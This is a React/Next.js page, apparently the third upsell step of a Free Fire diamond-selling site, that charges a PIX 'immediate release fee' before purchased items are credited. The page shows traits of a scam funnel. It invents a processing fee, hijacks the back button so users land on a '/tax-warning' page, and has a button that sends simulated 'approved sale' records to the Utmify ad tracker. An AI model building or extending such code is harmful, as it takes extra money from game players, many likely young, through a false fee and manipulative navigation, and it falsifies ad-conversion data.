
'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import { Header } from '@/components/freefire/Header';
import { Footer } from '@/components/freefire/Footer';
import { cn } from '@/lib/utils';
import { taxOffer } from '@/lib/data';
import { useToast } from '@/hooks/use-toast';
import { PaymentPayload } from '@/interfaces/types';
import BackRedirect from '@/components/freefire/BackRedirect';

// Tipos para os dados do cliente
interface CustomerData {
    name: string;
    email: string;
    phone: string;
}

const Upsell3Page = () => {
    const router = useRouter();
    const { toast } = useToast();
    const [isSubmitting, setIsSubmitting] = useState(false);

    const handleDecline = () => {
        router.push('/tax-warning');
    };

    const handlePurchase = async (isSimulation = false) => {
        setIsSubmitting(true);
        const selectedProduct = taxOffer[0];

        const customerDataString = localStorage.getItem('customerData');
        const playerName = localStorage.getItem('playerName') || 'Desconhecido';
        
        if (!customerDataString) {
            toast({
                variant: "destructive",
                title: "Erro",
                description: "Dados do cliente não encontrados. Por favor, reinicie a compra.",
            });
            setIsSubmitting(false);
            router.push('/');
            return;
        }

        const customerData: CustomerData = JSON.parse(customerDataString);
        const utmQuery = new URLSearchParams(window.location.search).toString();

        const payloadItems = [{
            id: selectedProduct.id,
            title: selectedProduct.name,
            unitPrice: selectedProduct.price,
            quantity: 1,
            tangible: false
        }];
        
        if(isSimulation) {
            try {
                const res = await fetch('/api/simulate-payment', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        customer: customerData,
                        items: payloadItems,
                        totalAmountInCents: Math.round(selectedProduct.price * 100),
                        utmQuery: utmQuery,
                    }),
                });
                if (!res.ok) {
                    const errorData = await res.json();
                    throw new Error(errorData.error || 'Erro na simulação.');
                }
                toast({ title: 'Simulação Concluída!', description: 'Venda aprovada enviada para Utmify.'});
                router.push('/success'); // Redireciona para a página de sucesso
            } catch (error: any) {
                toast({ variant: 'destructive', title: 'Erro na Simulação', description: error.message });
            } finally {
                setIsSubmitting(false);
            }
            return;
        }

        try {
            const payload: Omit<PaymentPayload, 'cpf'> = {
                name: customerData.name,
                email: customerData.email,
                phone: customerData.phone.replace(/\D/g, ''),
                paymentMethod: "PIX",
                amount: selectedProduct.price,
                externalId: `ff-upsell3-tax-${Date.now()}`,
                items: payloadItems,
                utmQuery,
                traceable: true,
            };

            const response = await fetch("/api/create-payment", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.message || "Erro ao criar o pagamento para a taxa.");
            }
            
            localStorage.setItem('paymentData', JSON.stringify({
                ...data,
                playerName: playerName,
                amount: selectedProduct.formattedPrice,
                numericAmount: selectedProduct.price,
                diamonds: selectedProduct.totalAmount,
                originalAmount: selectedProduct.originalAmount,
                bonusAmount: selectedProduct.bonusAmount,
                totalAmount: selectedProduct.totalAmount,
                productId: selectedProduct.id,
                items: payloadItems,
                utmQuery: utmQuery,
            }));
            
            router.push('/buy');

        } catch (error: any) {
            toast({
                variant: "destructive",
                title: "Erro no Pagamento",
                description: error.message,
            });
            setIsSubmitting(false);
        }
    };

    return (
        <div className="flex flex-col min-h-screen bg-gray-50">
            <BackRedirect redirectTo="/tax-warning" />
            <Header />
            <main className="flex-1 flex flex-col items-center justify-center p-4 text-center">
                <div className="bg-white rounded-2xl shadow-lg p-6 md:p-10 max-w-lg w-full border">
                    <h1 className="text-2xl md:text-3xl font-bold text-gray-800 uppercase tracking-wider">
                        Taxa de Liberação Imediata
                    </h1>
                    <p className="mt-3 text-base text-gray-600">
                        Para que seus itens sejam creditados em sua conta instantaneamente, é necessária uma pequena taxa de liberação para cobrir os custos de processamento.
                    </p>
                    
                    <div className="my-8">
                       <div className={cn("p-4 rounded-lg border-2 border-destructive bg-destructive/5 text-left flex items-center gap-4")}>
                           <div className="flex-shrink-0">
                               <Image src="https://i.ibb.co/zTHMnnGZ/Screenshot-25.png" alt="Taxa" width={40} height={40} data-ai-hint="fee icon" />
                           </div>
                           <div>
                               <h2 className="text-lg font-bold text-gray-800">{taxOffer[0].name}</h2>
                               <p className="text-2xl font-extrabold text-gray-900">{taxOffer[0].formattedPrice}</p>
                           </div>
                       </div>
                    </div>

                    <div className="flex flex-col gap-3">
                        <Button
                            onClick={() => handlePurchase(false)}
                            disabled={isSubmitting}
                            className="w-full text-lg py-6 font-bold"
                            variant="destructive"
                        >
                            {isSubmitting ? 'Processando...' : 'Pagar Taxa de Liberação'}
                        </Button>
                         <Button
                            onClick={() => handlePurchase(true)}
                            disabled={isSubmitting}
                            variant="outline"
                            className="w-full text-lg py-6 font-bold"
                        >
                            {isSubmitting ? 'Simulando...' : 'Simular Compra'}
                        </Button>
                        <Button
                            onClick={handleDecline}
                            variant="link"
                            className="text-gray-500 hover:text-gray-700"
                        >
                            Não, obrigado.
                        </Button>
                    </div>
                </div>
            </main>
            <Footer />
        </div>
    );
};

export default Upsell3Page;
